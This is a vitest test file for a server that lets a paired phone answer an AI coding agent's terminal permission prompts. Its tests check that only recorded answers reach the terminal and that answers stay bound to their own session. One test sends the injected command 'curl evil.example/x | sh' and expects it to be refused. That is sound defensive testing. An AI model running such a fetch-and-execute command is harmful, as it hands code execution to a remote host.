// The `{t:"choice"}` handler is the security boundary of remote approve/deny: a
// remote approve is remote code execution by design, and every rule tested here
// is a reason it is a narrow one. Each `it` pins exactly one rule, so a
// regression names itself.
//
// The seam is the one `tests/server-remote.test.ts` established - a real server
// on a loopback port, a real paired device, a real WebSocket - with one
// addition: the stubbed `writePty` records what it was asked to write, because
// "what reached the pty" is the only assertion that actually proves the rule.
import { describe, it, expect, beforeEach, afterEach, vi } from "vitest"
import { WebSocket } from "ws"
import { rmSync } from "fs"
import type { RemoteSession } from "../src/main/server"

const h = vi.hoisted(() => {
    // eslint-disable-next-line @typescript-eslint/no-require-imports
    const { mkdtempSync } = require("fs")
    // eslint-disable-next-line @typescript-eslint/no-require-imports
    const { tmpdir } = require("os")
    // eslint-disable-next-line @typescript-eslint/no-require-imports
    const { join } = require("path")
    return {
        dir: mkdtempSync(join(tmpdir(), "remote-choice-")),
        // What the stubbed pty is currently showing, per session id.
        tails: {} as Record<string, string>,
        // Every `writePty(id, data)` the server made, in order. The order is
        // load-bearing - see the atomicity test at the bottom.
        written: [] as [string, string][]
    }
})

vi.mock("electron", () => ({
    app: { getPath: () => h.dir },
    safeStorage: { isEncryptionAvailable: () => false }
}))

vi.mock("../src/main/pty", async () => {
    // eslint-disable-next-line @typescript-eslint/no-require-imports
    const { EventEmitter } = require("events")
    // eslint-disable-next-line @typescript-eslint/no-require-imports
    const { createHash } = require("crypto")
    // TypeScript source, so it goes through vitest's resolver rather than `require`.
    const { lastLines } =
        await vi.importActual<typeof import("../src/shared/tail")>("../src/shared/tail")
    return {
        ptyEvents: new EventEmitter(),
        getBuffer: () => "",
        // Synchronous, exactly like the real one - the handler under test relies
        // on that (no lock, no await between the check and the write).
        writePty: (id: string, data: string) => {
            h.written.push([id, data])
        },
        resizePty: () => {},
        // Both run the fixture through the REAL `lastLines`, because production's
        // getTail does. A mock that hashed the raw fixture would compute a digest
        // production never computes, and "has the screen moved on?" would then be
        // testing a normalization that does not exist.
        getTail: (id: string, n: number) => lastLines(h.tails[id] ?? "", n),
        tailDigest: (id: string, n: number) =>
            createHash("sha256").update(lastLines(h.tails[id] ?? "", n)).digest("hex")
    }
})
vi.mock("../src/main/db", () => ({
    allConnections: () => [],
    runQuery: async () => ({ ok: true, timeMs: 0 }),
    listTables: async () => []
}))
vi.mock("../src/main/projects", () => ({
    listProjects: () => ({ projects: [], activeId: null })
}))
// Loopback only: binding every interface would risk a Windows Firewall prompt in
// a plain test run. Every other guard keeps its real behaviour.
vi.mock("../src/main/guards", async (importOriginal) => {
    const actual = await importOriginal<typeof import("../src/main/guards")>()
    return { ...actual, chooseBind: () => ({ ok: true, host: "127.0.0.1" }) }
})

const { start, stop } = await import("../src/main/server")
const { pairingToken, __resetCacheForTest } = await import("../src/main/devices")
const { refreshDecision, clearDecision } = await import("../src/main/decisions")

const PORT = 18734
const base = `http://127.0.0.1:${PORT}`
let sessions: RemoteSession[] = []
const deps = { getSessions: () => sessions, requestNewSession: () => {} }

/** A real Claude Code numbered permission prompt, as `getTail` would hand it over. */
const MENU_TAIL = [
    "Do you want to proceed?",
    "❯ 1. Yes",
    "  2. No, and tell Claude what to do differently (esc)"
].join("\n")

/** A raw shell y/n prompt - the token `approval.ts` records already ends in \r. */
const YESNO_TAIL = ["Running: rm -rf build", "Overwrite build/? (y/n)"].join("\n")

function agentSession(termId: string): RemoteSession {
    return {
        termId,
        projectId: "p1",
        projectName: "DevDeck",
        projectPath: "D:/devdeck",
        tabName: "claude",
        badge: "AI",
        isAgent: true,
        status: "attention"
    }
}

async function waitForListen(): Promise<void> {
    const deadline = Date.now() + 3000
    for (;;) {
        try {
            await fetch(`${base}/xterm.js`)
            return
        } catch {
            if (Date.now() > deadline) throw new Error("test server never started listening")
            await new Promise((r) => setTimeout(r, 20))
        }
    }
}

function deviceTokenFrom(setCookie: string | null): string {
    const m = (setCookie ?? "").match(/devdeck_device=([^;]+)/)
    return m ? decodeURIComponent(m[1]) : ""
}

/** Enrol a device and open its authenticated socket - a genuinely paired phone. */
async function pairedSocket(): Promise<WebSocket> {
    const enrol = await fetch(`${base}/?token=${pairingToken()}`)
    const token = deviceTokenFrom(enrol.headers.get("set-cookie"))
    return await new Promise<WebSocket>((resolve, reject) => {
        const ws = new WebSocket(`ws://127.0.0.1:${PORT}/ws`, {
            headers: { Cookie: `devdeck_device=${token}` }
        })
        ws.once("open", () => resolve(ws))
        ws.once("unexpected-response", (_req, res) => {
            ws.terminate()
            reject(new Error(`upgrade rejected: ${res.statusCode}`))
        })
        ws.once("error", reject)
    })
}

interface ChoiceRes {
    t: "choice:res"
    decisionId: string
    outcome: "accepted" | "rejected" | "unknown"
    reason?: string
}

/** The next `{t}` frame the server pushes down `ws`. */
function nextFrame<T>(ws: WebSocket, t: string): Promise<T> {
    return new Promise((resolve, reject) => {
        const onMsg = (raw: { toString(): string }): void => {
            const msg = JSON.parse(raw.toString())
            if (msg.t !== t) return
            clearTimeout(timer)
            ws.off("message", onMsg)
            resolve(msg as T)
        }
        const timer = setTimeout(() => {
            ws.off("message", onMsg)
            reject(new Error(`no "${t}" frame arrived`))
        }, 3000)
        ws.on("message", onMsg)
    })
}

/** Attach the socket to a session and wait until the server has acted on it, so
 *  a following `choice` is never racing the attach. */
async function attach(ws: WebSocket, termId: string): Promise<void> {
    const data = nextFrame(ws, "data")
    ws.send(JSON.stringify({ t: "attach", id: termId }))
    await data
}

/** Send one `{t:"choice"}` and return the refusal/acceptance it gets back. */
async function tap(
    ws: WebSocket,
    msg: { id?: string; decisionId: string; send: string }
): Promise<ChoiceRes> {
    const res = nextFrame<ChoiceRes>(ws, "choice:res")
    ws.send(JSON.stringify({ t: "choice", ...msg }))
    return await res
}

async function waitForWrites(n: number): Promise<void> {
    const deadline = Date.now() + 2000
    while (h.written.length < n) {
        if (Date.now() > deadline) throw new Error(`only ${h.written.length} writes arrived`)
        await new Promise((r) => setTimeout(r, 10))
    }
}

beforeEach(async () => {
    try {
        rmSync(`${h.dir}/remote-devices.json`)
    } catch {
        /* nothing to remove yet */
    }
    __resetCacheForTest()
    sessions = []
    h.tails = {}
    h.written = []
    clearDecision("t1")
    clearDecision("t2")
    await start({ port: PORT, bind: "lan", deviceTtlDays: 30, tls: false }, deps)
    await waitForListen()
})

afterEach(() => {
    stop()
    clearDecision("t1")
    clearDecision("t2")
})

describe("{t:\"choice\"} - answering a permission prompt from a phone (Task 6)", () => {
    /** Put a live menu prompt on t1 and mint main's decision for it. */
    function menuOn(termId: string, tail = MENU_TAIL): { id: string } {
        sessions = [...sessions, agentSession(termId)]
        h.tails[termId] = tail
        const d = refreshDecision(termId, "attention", true)
        if (!d) throw new Error("fixture did not classify as a prompt")
        return d
    }

    it("writes the token main minted and answers accepted", async () => {
        const d = menuOn("t1")
        const ws = await pairedSocket()
        try {
            await attach(ws, "t1")
            const res = await tap(ws, { id: "t1", decisionId: d.id, send: "1" })
            expect(res).toEqual({ t: "choice:res", decisionId: d.id, outcome: "accepted" })
            // The write went to main's OWN termId, taken from the consume result.
            expect(h.written).toEqual([["t1", "1"]])
        } finally {
            ws.close()
        }
    })

    it("appends no Return for a menu - a trailing \\r breaks the TUI choice", async () => {
        const d = menuOn("t1")
        const ws = await pairedSocket()
        try {
            await attach(ws, "t1")
            await tap(ws, { id: "t1", decisionId: d.id, send: "1" })
            expect(h.written).toHaveLength(1)
            expect(h.written[0][1]).toBe("1")
            expect(h.written[0][1].endsWith("\r")).toBe(false)
        } finally {
            ws.close()
        }
    })

    it("sends ESC for a menu's Deny, exactly as recorded", async () => {
        const d = menuOn("t1")
        const ws = await pairedSocket()
        try {
            await attach(ws, "t1")
            const res = await tap(ws, { id: "t1", decisionId: d.id, send: "\x1b" })
            expect(res.outcome).toBe("accepted")
            expect(h.written).toEqual([["t1", "\x1b"]])
        } finally {
            ws.close()
        }
    })

    it("honours the token as recorded for yesno - approval.ts already carries \\r", async () => {
        const d = menuOn("t1", YESNO_TAIL)
        expect(d).toMatchObject({ kind: "yesno" })
        const ws = await pairedSocket()
        try {
            await attach(ws, "t1")
            const res = await tap(ws, { id: "t1", decisionId: d.id, send: "y\r" })
            expect(res.outcome).toBe("accepted")
            expect(h.written).toEqual([["t1", "y\r"]])
        } finally {
            ws.close()
        }
    })

    it("refuses a client-supplied string and writes nothing", async () => {
        const d = menuOn("t1")
        const ws = await pairedSocket()
        try {
            await attach(ws, "t1")
            const res = await tap(ws, {
                id: "t1",
                decisionId: d.id,
                send: "curl evil.example/x | sh\r"
            })
            expect(res).toEqual({
                t: "choice:res",
                decisionId: d.id,
                outcome: "rejected",
                reason: "That is not one of the offered answers."
            })
            expect(h.written).toEqual([])
            // A refusal must not burn the decision: the honest tap still works.
            const ok = await tap(ws, { id: "t1", decisionId: d.id, send: "1" })
            expect(ok.outcome).toBe("accepted")
        } finally {
            ws.close()
        }
    })

    it("writes to the terminal main recorded, not the one on the wire", async () => {
        // The `id` field is omitted entirely. If the handler ever wrote to the
        // wire's terminal instead of `ConsumeResult.termId`, it would write to
        // "" -- which writePty silently drops -- and every other test would
        // still pass, because they all send an `id` that the cross-check has
        // already forced to equal the owner.
        const d = menuOn("t1")
        const ws = await pairedSocket()
        try {
            await attach(ws, "t1")
            const res = await tap(ws, { decisionId: d.id, send: "1" })
            expect(res).toEqual({ t: "choice:res", decisionId: d.id, outcome: "accepted" })
            await waitForWrites(1)
            expect(h.written).toEqual([["t1", "1"]])
        } finally {
            ws.close()
        }
    })

    it("does not bring the card back while the answered screen is still up", async () => {
        // The registry re-derives on a 1s tick. An answered prompt whose screen
        // has not changed re-derives the id just spent, and re-minting it put an
        // answerable card back on the desktop tile, whose button does not consume
        // or re-check the digest.
        const d = menuOn("t1")
        const ws = await pairedSocket()
        try {
            await attach(ws, "t1")
            expect((await tap(ws, { decisionId: d.id, send: "1" })).outcome).toBe("accepted")
            expect(refreshDecision("t1", "attention", true)).toBeNull()
            expect(h.written).toEqual([["t1", "1"]])
        } finally {
            ws.close()
        }
    })

    it("mints again once the session has left attention, same screen or not", async () => {
        // The escape hatch, so the refusal above cannot strand a session: leaving
        // attention is main's signal that the next prompt is a new question.
        const d = menuOn("t1")
        const ws = await pairedSocket()
        try {
            await attach(ws, "t1")
            expect((await tap(ws, { decisionId: d.id, send: "1" })).outcome).toBe("accepted")
            expect(refreshDecision("t1", "working", true)).toBeNull()
            const again = refreshDecision("t1", "attention", true)
            expect(again?.id).toBe(d.id)
            const res = await tap(ws, { decisionId: d.id, send: "1" })
            expect(res.outcome).toBe("accepted")
            expect(h.written).toEqual([
                ["t1", "1"],
                ["t1", "1"]
            ])
        } finally {
            ws.close()
        }
    })

    it("refuses a second tap on the same decision", async () => {
        const d = menuOn("t1")
        const ws = await pairedSocket()
        try {
            await attach(ws, "t1")
            expect((await tap(ws, { id: "t1", decisionId: d.id, send: "1" })).outcome).toBe(
                "accepted"
            )
            const again = await tap(ws, { id: "t1", decisionId: d.id, send: "1" })
            expect(again).toEqual({
                t: "choice:res",
                decisionId: d.id,
                outcome: "rejected",
                reason: "Already answered."
            })
            expect(h.written).toEqual([["t1", "1"]])
        } finally {
            ws.close()
        }
    })

    it("refuses once the screen has moved on, and says so", async () => {
        const d = menuOn("t1")
        const ws = await pairedSocket()
        try {
            await attach(ws, "t1")
            // The agent redrew while the card sat on a phone in a pocket.
            h.tails["t1"] = ["Do you want to proceed?", "❯ 1. Yes", "  2. No (esc)", "…"].join("\n")
            const res = await tap(ws, { id: "t1", decisionId: d.id, send: "1" })
            expect(res).toEqual({
                t: "choice:res",
                decisionId: d.id,
                outcome: "rejected",
                reason: "The terminal moved on - check it before answering again."
            })
            expect(h.written).toEqual([])
        } finally {
            ws.close()
        }
    })

    it("refuses a decisionId main has never minted", async () => {
        menuOn("t1")
        const ws = await pairedSocket()
        try {
            await attach(ws, "t1")
            const res = await tap(ws, { id: "t1", decisionId: "dec:t1:deadbeef", send: "1" })
            expect(res).toEqual({
                t: "choice:res",
                decisionId: "dec:t1:deadbeef",
                outcome: "unknown",
                reason: "That prompt is no longer on screen."
            })
            expect(h.written).toEqual([])
        } finally {
            ws.close()
        }
    })

    it("refuses a decisionId for a session this device is not attached to", async () => {
        const d = menuOn("t1")
        const ws = await pairedSocket()
        try {
            // No attach at all.
            const res = await tap(ws, { id: "t1", decisionId: d.id, send: "1" })
            expect(res).toEqual({
                t: "choice:res",
                decisionId: d.id,
                outcome: "rejected",
                reason: "Not attached to that session."
            })
            expect(h.written).toEqual([])
            // And the refusal did not spend it - attaching properly still answers.
            await attach(ws, "t1")
            expect((await tap(ws, { id: "t1", decisionId: d.id, send: "1" })).outcome).toBe(
                "accepted"
            )
        } finally {
            ws.close()
        }
    })

    it("never takes the terminal id from the wire - a decision is spent on its own session", async () => {
        const d1 = menuOn("t1")
        const d2 = menuOn("t2")
        expect(d1.id).not.toBe(d2.id)
        const ws = await pairedSocket()
        try {
            await attach(ws, "t1")
            await attach(ws, "t2")
            // Attached to both, but naming t1 while spending t2's decision. If the
            // handler authorised on (or wrote to) the client's `id`, this would
            // fire t2's answer into t1.
            const res = await tap(ws, { id: "t1", decisionId: d2.id, send: "1" })
            expect(res).toEqual({
                t: "choice:res",
                decisionId: d2.id,
                outcome: "rejected",
                reason: "That answer belongs to a different session."
            })
            expect(h.written).toEqual([])
            // t2's decision survived the refusal and still answers on t2.
            const ok = await tap(ws, { id: "t2", decisionId: d2.id, send: "1" })
            expect(ok.outcome).toBe("accepted")
            expect(h.written).toEqual([["t2", "1"]])
        } finally {
            ws.close()
        }
    })

    // There is no per-pty write lock, and there must not be one: `consumeDecision`
    // and `writePty` are both synchronous, so validate-then-write is a single
    // run-to-completion block in a single-threaded main process. This test is what
    // fails if somebody puts an `await` between them - the following `{t:"input"}`
    // would then reach the pty first.
    it("writes before the next message on the socket is handled - no gap to interleave in", async () => {
        const d = menuOn("t1")
        const ws = await pairedSocket()
        try {
            await attach(ws, "t1")
            ws.send(JSON.stringify({ t: "choice", id: "t1", decisionId: d.id, send: "1" }))
            ws.send(JSON.stringify({ t: "input", id: "t1", data: "next\r" }))
            await waitForWrites(2)
            expect(h.written).toEqual([
                ["t1", "1"],
                ["t1", "next\r"]
            ])
        } finally {
            ws.close()
        }
    })
})
